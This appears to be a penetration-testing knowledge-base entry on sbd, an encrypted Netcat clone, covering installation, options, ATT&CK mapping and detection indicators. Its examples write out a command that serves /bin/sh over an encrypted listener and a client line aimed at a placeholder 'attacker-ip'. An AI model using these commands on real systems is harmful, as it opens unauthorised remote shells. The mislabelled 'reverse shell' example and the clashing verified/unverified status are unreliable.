---
type: tool
description: >-
  Portable Netcat clone with strong AES encryption for secure TCP communication
  and backdoors.
url: 'https://www.sweet32.info/Sweet32/sbd.html'
tags:
  - network
  - encryption
  - c2
  - backdoor
  - netcat
platforms:
  - Linux
  - Windows
  - Unix
verified: true
validated: true
---

# sbd

**Status**: Unverified

## Overview

sbd is a lightweight, portable alternative to Netcat (nc) that adds strong encryption to TCP/IP communications. It is commonly used in penetration testing for creating encrypted backdoors, reverse shells, and secure data tunnels. sbd supports program execution on connection, source port binding, and automatic reconnection, making it suitable for command and control (C2) operations where encryption helps evade network monitoring.

## Description

sbd implements AES-CBC-128 encryption combined with HMAC-SHA1 for integrity, ensuring confidentiality and authenticity of data in transit. It operates solely over TCP and is compatible with Unix-like systems and Windows. Unlike standard Netcat, sbd requires a shared secret key for encryption, which must be consistent between client and server. It does not support UDP and focuses on reliability features like delayed reconnection for persistent access.

## Features

- AES-CBC-128 + HMAC-SHA1 encryption for secure communication
- Program execution (-e option) for spawning shells or commands on connection
- Custom source port selection (-S) to mimic legitimate traffic
- Automatic reconnection with configurable delay (-d) for resilience
- Bind to specific addresses (-b) for multi-homed hosts
- SSL/TLS support via optional certificates (-C, -K)
- Portable across Unix and Windows platforms

## Installation

### Requirements

- GCC or compatible compiler for building from source
- OpenSSL libraries for encryption (usually pre-installed on Kali)

### Install Commands

```bash
# On Kali Linux (pre-installed or from repos)
sudo apt update && sudo apt install sbd

# On Ubuntu
declare -a deps=(build-essential libssl-dev git)
for dep in "${deps[@]}"; do sudo apt install -y $dep; done
git clone https://github.com/christophetd/sbd.git
cd sbd
make
sudo make install

# On Windows (via Cygwin or build from source)
# Download pre-built binary or compile with MinGW
```

## Basic Usage

```bash
sbd --help
```

### Common Options

| Option | Description |
|--------|-------------|
| -h, --help | Show help message |
| -l | Listen mode |
| -p port | Specify port |
| -e prog | Execute program on connection |
| -k key | Set encryption key (hex) |
| -d delay | Reconnection delay in seconds |
| -S srcport | Source port |
| -V | Verbose output |

## Examples

### Example 1: Basic Usage

Server (listener):
```bash
sbd -l -p 4444
```

Client (connect):
```bash
sbd 192.168.1.100 4444
```

### Example 2: Advanced Usage

Encrypted reverse shell server:
```bash
sbd -l -p 4444 -e /bin/sh -k deadbeef
```

Client connection:
```bash
sbd -k deadbeef attacker-ip 4444
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Encrypted Channel]] Encrypted Channel
- [[Standard Non-Application Layer Protocol]] Non-Application Layer Protocol
- [[Windows Command Shell]] Windows Command Shell (for -e usage)

### Tactics

- [[Command and Control]] Command And Control
- [[Execution]] Execution

## Detection

Indicators and methods for detecting this tool's usage:

- Unusual TCP connections with encrypted payloads (entropy analysis on traffic)
- Processes named 'sbd' or spawned shells from unknown binaries
- Network flows to high ports with consistent key-based patterns
- File system artifacts: sbd binary in /tmp or unusual locations
- Use YARA rules for the binary signature or monitor for make install of sbd

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Netcat]]
- [[tools/ncat]]
- [[tools/socat]]

## References

- Official sbd documentation: https://www.sweet32.info/Sweet32/sbd.html
- Kali Linux package: https://pkg.kali.org/package/sbd
- GitHub repository: https://github.com/christophetd/sbd
